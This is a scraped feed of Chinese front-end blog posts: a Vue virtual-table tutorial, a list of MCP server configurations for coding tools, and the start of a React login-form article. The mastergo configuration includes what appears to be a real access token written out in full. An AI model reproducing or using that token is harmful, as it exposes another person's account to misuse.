<p>比如你有 10 万条数据，但 <code>list</code> 可能只包含 20-30 条数据，这就是虚拟列表的核心优势。</p>
<h4 data-id="heading-9">2. <strong>containerProps</strong> - 滚动的"指挥官"</h4>
<p>这是绑定到外层容器的属性对象，它的结构大概是这样的：</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">ref</span>: containerRef,           <span class="hljs-comment">// 容器的引用</span>
  <span class="hljs-attr">onScroll</span>: <span class="hljs-function">() =&gt;</span> {            <span class="hljs-comment">// 滚动事件监听</span>
    <span class="hljs-title function_">calculateRange</span>();          <span class="hljs-comment">// 重新计算应该显示哪些数据</span>
  },
  <span class="hljs-attr">style</span>: {
    <span class="hljs-attr">overflowY</span>: <span class="hljs-string">"auto"</span>          <span class="hljs-comment">// 允许垂直滚动</span>
  }
}
</code></pre>
<p><strong>核心作用</strong>：</p>
<ul>
<li><strong>ref</strong>：VueUse 需要获取容器的 DOM 引用，以便计算可视区域的大小和滚动位置</li>
<li><strong>onScroll</strong>：这是虚拟列表的"心跳"。每次滚动时，它会触发 <code>calculateRange()</code> 函数，重新计算当前应该显示哪些数据</li>
<li><strong>style</strong>：确保容器可以滚动</li>
</ul>
<p>在我们的实现中，这样使用：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;div v-bind="containerProps" class="virtual-scroll-container"&gt;
  &lt;!-- 内容 --&gt;
&lt;/div&gt;
</code></pre>
<p>通过 <code>v-bind</code> 直接绑定，所有的属性和事件监听都会自动应用到容器上。</p>
<h4 data-id="heading-10">3. <strong>wrapperProps</strong> - 高度的"撑杆"</h4>
<p>这是绑定到内层包裹元素的属性对象，它的结构是这样的：</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">width</span>: <span class="hljs-string">"100%"</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-string">"5500000px"</span>,    <span class="hljs-comment">// 注意这个惊人的高度！</span>
  <span class="hljs-attr">marginTop</span>: <span class="hljs-string">"0px"</span>        <span class="hljs-comment">// 动态调整，实现滚动偏移</span>
}
</code></pre>
<p><strong>为什么高度这么夸张？</strong></p>
<p>假设你有 10 万条数据，每条高度 55px，那么完整列表的总高度就是：</p>
<pre><code class="hljs language-ini" lang="ini">100000 × <span class="hljs-attr">55</span> = <span class="hljs-number">5</span>,<span class="hljs-number">500</span>,<span class="hljs-number">000</span>px = <span class="hljs-number">5500000</span>px
</code></pre>
<p>这个高度是计算出来的"虚拟高度"。虽然实际只渲染了几十条数据，但通过设置这个巨大的高度，可以让滚动条的长度和滚动范围与真实的 10 万条数据保持一致。</p>
<p><strong>marginTop 的妙用</strong>：</p>
<p>当你滚动到列表中间时，比如滚动到第某条数据，<code>marginTop</code> 会动态调整为正值（比如 <code>2915px</code>），这样可以：</p>
<ol>
<li>让当前渲染的数据显示在正确的位置</li>
<li>保持滚动条的位置准确</li>
</ol>
<p>这就像是一个"移动的窗口"，窗口内的内容在不断变化，但窗口的位置始终准确。通过动态调整 <code>marginTop</code>，VueUse 将实际渲染的少量数据"推"到了应该显示的位置，从而实现了虚拟滚动的效果。</p>
<p>在我们的实现中：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;div v-bind="wrapperProps"&gt;
  &lt;a-table ... /&gt;
&lt;/div&gt;
</code></pre>
<p>这个包裹层撑起了整个虚拟列表的"骨架"，让浏览器以为真的有 10 万条数据在那里。</p>
<h2 data-id="heading-11">封装</h2>
<h3 data-id="heading-12">1. <strong>容器高度的控制</strong></h3>
<p>虚拟列表需要一个固定高度的容器来触发滚动。我们通过 CSS 变量动态绑定容器高度：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;style scoped&gt;
.virtual-scroll-container {
  height: v-bind(containerHeight + 'px');
  overflow-y: auto;
  /* 其他样式... */
}
&lt;/style&gt;
</code></pre>
<p>这样，父组件可以通过 <code>container-height</code> prop 灵活控制可视区域的高度。</p>
<h3 data-id="heading-13">2. <strong>插槽的完整透传</strong></h3>
<p>为了保持 Ant Design Vue Table 的灵活性，我们需要把所有插槽都透传给内部的 Table 组件：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template v-for="(_, name) in $slots" #[name]="slotData"&gt;
  &lt;slot :name="name" v-bind="slotData || {}"&gt;&lt;/slot&gt;
&lt;/template&gt;
</code></pre>
<p>这样，父组件可以像使用原生 Table 一样使用自定义列、自定义单元格等功能。</p>
<h3 data-id="heading-14">3. <strong>必须注意的细节</strong></h3>
<p>在使用这个组件时，有一个容易被忽略的细节：<strong>表格列的 <code>ellipsis</code> 必须设置为 <code>true</code></strong>。</p>
<p>为什么？因为虚拟列表的行高是固定的，如果内容超出了单元格，就会撑高行高，导致计算错位。设置 <code>ellipsis: true</code> 可以确保内容超出时显示省略号，而不是换行。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> columns = [
  { <span class="hljs-attr">title</span>: <span class="hljs-string">'类型'</span>, <span class="hljs-attr">key</span>: <span class="hljs-string">'type'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">400</span>, <span class="hljs-attr">ellipsis</span>: <span class="hljs-literal">true</span> },
  <span class="hljs-comment">// ...</span>
]
</code></pre>
<h2 data-id="heading-15">性能对比</h2>
<p>在测试页面中，我们生成了 <strong>10 万条数据</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> tableData = <span class="hljs-title function_">ref</span>(<span class="hljs-title function_">generateMockData</span>(<span class="hljs-number">100000</span>))
</code></pre>
<p>如果用原生的 Ant Design Vue Table 渲染，浏览器会直接"去世"。但使用虚拟列表封装后，滚动依然丝滑流畅。</p>
<p>这就是虚拟列表的魅力：无论数据有多少，实际渲染的 DOM 节点永远只有那么几十个。</p>
<h2 data-id="heading-16">使用方式</h2>
<p>使用这个组件非常简单，和原生 Table 几乎一样：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;v-table
  :data-source="tableData"
  :columns="columns"
  :row-height="55"
  :container-height="600"
  row-key="id"
/&gt;
</code></pre>
<p>唯一的区别是多了两个参数：</p>
<ul>
<li><code>row-height</code>：行高，必须准确</li>
<li><code>container-height</code>：容器高度，决定可视区域大小</li>
</ul>
<h2 data-id="heading-17">总结</h2>
<p>这个项目的核心思路很简单：</p>
<ol>
<li>借助 VueUse 的 <code>useVirtualList</code> 实现虚拟列表逻辑</li>
<li>将虚拟列表的数据转换为 Ant Design Vue Table 需要的格式</li>
<li>通过 props 和插槽保持组件的灵活性</li>
</ol>
<hr/>
<p>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbaozjj%2Fant-virtual-table%2Fblob%2Fmain%2Fsrc%2Fcomponents%2FvTable%2Findex.vue" target="_blank" title="https://github.com/baozjj/ant-virtual-table/blob/main/src/components/vTable/index.vue" ref="nofollow noopener noreferrer">ant-virtual-table</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[常用MCP记录]]></title>    <link>https://juejin.cn/post/7591942733365182498</link>    <guid>https://juejin.cn/post/7591942733365182498</guid>    <pubDate>2026-01-06T06:57:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591942733365182498" data-draft-id="7592119218025201699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="常用MCP记录"/> <meta itemprop="keywords" content="前端,MCP"/> <meta itemprop="datePublished" content="2026-01-06T06:57:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="holidaypenguin"/> <meta itemprop="url" content="https://juejin.cn/user/2313028194801421"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            常用MCP记录
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2313028194801421/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    holidaypenguin
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:57:28.000Z" title="Tue Jan 06 2026 06:57:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">MCP 广场</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Fmcp" target="_blank" title="https://cloud.tencent.com/developer/mcp" ref="nofollow noopener noreferrer">腾讯云开发者社区-腾讯云 开发者 MCP广场_开发者MCP服务_MCP 服务器- 腾讯云</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.modelscope.cn%2Fmcp" target="_blank" title="https://www.modelscope.cn/mcp" ref="nofollow noopener noreferrer">MCP 广场 · 魔搭社区</a></li>
</ul>
<h2 data-id="heading-1">MCP 基本用法</h2>
<pre><code class="hljs language-josn" lang="josn">{
  "mcpServers": {
    "xxxxx": {}
  }
}
</code></pre>
<p>MCP 配置也区分全局配置和局部项目配置，以 kiro 为例，将项目特有的MCP 配置在文件 <code>.kiro/setting/mcp.json</code> 中。</p>
<h2 data-id="heading-2">使用记录</h2>
<h3 data-id="heading-3">chrome-devtools 调试网页</h3>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"mcpServers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"chrome-devtools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"command"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npx"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-string">"-y"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"chrome-devtools-mcp@latest"</span>
      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"disabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"autoApprove"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-string">"take_screenshot"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"navigate_page"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"evaluate_script"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"click"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"take_snapshot"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"list_pages"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"wait_for"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"list_console_messages"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"new_page"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"get_console_message"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"select_page"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"press_key"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-string">"fill"</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-4">mastergo 读取UI设计</h3>
<pre><code class="hljs language-josn" lang="josn">{
  "mcpServers": {
    "mastergo-magic-mcp": {
      "command": "npx",
      "args": [
        "-y",
        "@mastergo/magic-mcp",
        "--token=&lt;MG_MCP_TOKEN&gt;",
        "--url=https://mastergo.com"
      ],
      "env": {
        "MG_MCP_TOKEN": "mg_2b021b165bf34464aa4eb6ade9c9524f"
      },
      "disabled": false
    },
  }
}
</code></pre>
<h3 data-id="heading-5">lark_open_doc_search 读取飞书文档</h3>
<pre><code class="hljs language-josn" lang="josn">{
  "mcpServers": {
    "lark_open_doc_search": {
      "command": "npx",
      "args": [
        "-y",
        "@larksuiteoapi/lark-mcp",
        "recall-developer-documents"
      ]
    },
  }
}
</code></pre>
<h3 data-id="heading-6">fetch 网页内容抓取</h3>
<p>这个需要先安装 python 环境 和 uvx</p>
<pre><code class="hljs language-josn" lang="josn">{
  "mcpServers": {
    "fetch": {
      "command": "uvx",
      "args": [
        "mcp-server-fetch"
      ],
      "env": {},
      "disabled": false,
      "autoApprove": []
    },
  }
}
</code></pre>
<h3 data-id="heading-7">apifox-mcp-server 读取接口json</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.apifox.com%2F6327891m0" target="_blank" title="https://docs.apifox.com/6327891m0" ref="nofollow noopener noreferrer">通过 MCP 使用 OpenAPI/Swagger 文档 - Apifox 帮助文档</a></p>
<pre><code class="hljs language-josn" lang="josn">{
  "mcpServers": {
    "API 文档": {
      "command": "npx",
      "args": [
        "-y",
        "apifox-mcp-server@latest",
        "--oas=https://test-xxxx.xxx.com/xxx/docs/api.json"
      ]
    },
  }
}
</code></pre>
<p>因为这个MCP是指定了接口文档地址，因此需要给每个前端项目单独配置。</p>
<h3 data-id="heading-8">swagger-mcp 读取接口json</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.modelscope.cn%2Fmcp%2Fservers%2F%40danishjsheikh%2Fswagger-mcp" target="_blank" title="https://www.modelscope.cn/mcp/servers/@danishjsheikh/swagger-mcp" ref="nofollow noopener noreferrer">Swagger-MCP抓取器 · MCP</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fswagger-mcp" target="_blank" title="https://www.npmjs.com/package/swagger-mcp" ref="nofollow noopener noreferrer">swagger-mcp - npm</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fswagger-mcp-tool" target="_blank" title="https://www.npmjs.com/package/swagger-mcp-tool" ref="nofollow noopener noreferrer">swagger-mcp-tool - npm</a></li>
</ul>
<p>因为这个MCP是指定了接口文档地址，因此需要给每个前端项目单独配置。因为使用了 npm 包，所以可以采用两种方式配置，一种是安装 npm 包，一种是不安装。</p>
<ol>
<li>安装 npm 依赖包
先全局安装  <code>npm i -g swagger-mcp</code>。</li>
</ol>
<pre><code class="hljs language-josn" lang="josn">{
  "mcpServers": {
    "API 文档": {
      "command": "swagger-mcp",
      "args": [
        "--specUrl=https://test-xxxx.xxx.com/xxx/docs/api.json"
      ],
      "autoApprove": [
        "get_endpoint_details",
        "fetch_swagger_info",
        "list_endpoints",
        "execute_api_request",
        "validate_api_response"
      ]
    },
  }
}
</code></pre>
<ol start="2">
<li>不想安装依赖可以使用npx</li>
</ol>
<pre><code class="hljs language-josn" lang="josn">{
  "mcpServers": {
    "API 文档": {
      "command": "npx",
      "disabled": false,
      "args": [
        "-y",
        "swagger-mcp@latest",
        "--specUrl=https://test-xxxx.xxx.com/xxx/docs/api.json"
      ],
      "autoApprove": [
        "get_endpoint_details",
        "fetch_swagger_info",
        "list_endpoints",
        "execute_api_request",
        "validate_api_response"
      ]
    },
  }
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[构建现代 React 登录表单：从 ESM 懒加载到 TailwindCSS 响应式设计]]></title>    <link>https://juejin.cn/post/7591878211087024163</link>    <guid>https://juejin.cn/post/7591878211087024163</guid>    <pubDate>2026-01-06T07:35:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591878211087024163" data-draft-id="7592017365146353704" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="构建现代 React 登录表单：从 ESM 懒加载到 TailwindCSS 响应式设计"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2026-01-06T07:35:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ohyeah"/> <meta itemprop="url" content="https://juejin.cn/user/740446536480618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            构建现代 React 登录表单：从 ESM 懒加载到 TailwindCSS 响应式设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/740446536480618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ohyeah
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T07:35:27.000Z" title="Tue Jan 06 2026 07:35:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在现代前端开发中，构建一个高效、可维护且用户体验良好的登录页面，早已不是简单地堆砌 HTML 表单元素。它融合了模块化架构、状态管理、UI 库集成、响应式布局以及性能优化等多方面技术。本文将以一个典型的 React 登录组件为例，深入剖析其背后的技术逻辑，涵盖 <strong>ESM（ECMAScript Module）的懒加载机制</strong>、<strong>React 的函数式状态管理</strong>、<strong>受控组件的设计哲学</strong>，以及 <strong>TailwindCSS 的响应式与状态驱动样式体系</strong>。</p>
<hr/>
<h2 data-id="heading-0">一、模块导入方式的演进：为何不再需要 <code>import React from 'react'</code>？</h2>
<p>早期 React 项目中，开发者习惯于在每个 JSX 文件顶部写上：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
</code></pre>
<p>这是因为 JSX 语法在编译阶段会被转换为 <code>React.createElement()</code> 调用，因此必须显式引入 <code>React</code> 对象。然而，自 <strong>React 17 起</strong>，官方引入了新的 JSX 转换机制（由 Babel 7.9+ 和 TypeScript 4.1+ 支持），使得编译器可以直接生成对 <code>jsx</code> 和 <code>jsxs</code> 函数的调用，而无需依赖全局的 <code>React</code> 对象。</p>
